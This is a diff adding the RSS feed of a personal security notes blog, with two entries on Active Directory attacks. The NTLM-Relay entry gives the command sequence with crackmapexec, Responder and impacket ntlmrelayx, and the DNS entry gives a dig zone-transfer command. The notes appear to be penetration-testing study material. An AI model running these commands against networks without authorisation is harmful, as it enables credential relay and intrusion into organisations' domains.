@@ -1,0 +1,33 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>💥 AD-Attacks on AlrikRr&#39;s Blog</title>
+    <link>https://AlrikRr.github.io/notes/active-directory/attacks/</link>
+    <description>Recent content in 💥 AD-Attacks on AlrikRr&#39;s Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language><atom:link href="https://AlrikRr.github.io/notes/active-directory/attacks/index.xml" rel="self" type="application/rss+xml" /><item>
+      <title>NTLM-Relay</title>
+      <link>https://AlrikRr.github.io/notes/active-directory/attacks/ntlm-relay/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://AlrikRr.github.io/notes/active-directory/attacks/ntlm-relay/</guid>
+      <description>NTLM-Relay Multi-Targets First gather all the ips that do not require smb signing
+crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt Then edit responder configuration
+sudo vim /usr/share/responder/responder.conf Turn off the SMB and HTTP option, then run
+sudo responder -I ppp0 -v Once the responder is up, you can run ntlm relay attack using impacket tools
+ntlmrelayx.py -t 192.168.64.129 -smb2support ntlmrelayx.py -tf targets.txt -smb2support -i More about it :
+viperone blog fox-it NTLM-Relay One-Shot The hacker (192.</description>
+    </item>
+    
+    <item>
+      <title>DNS Attacks</title>
+      <link>https://AlrikRr.github.io/notes/active-directory/attacks/dns/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://AlrikRr.github.io/notes/active-directory/attacks/dns/</guid>
+      <description> Zone Transfer dig axfr xyz.local@dc01.xyz.local </description>
+    </item>
+    
+    
+  </channel>
+</rss>
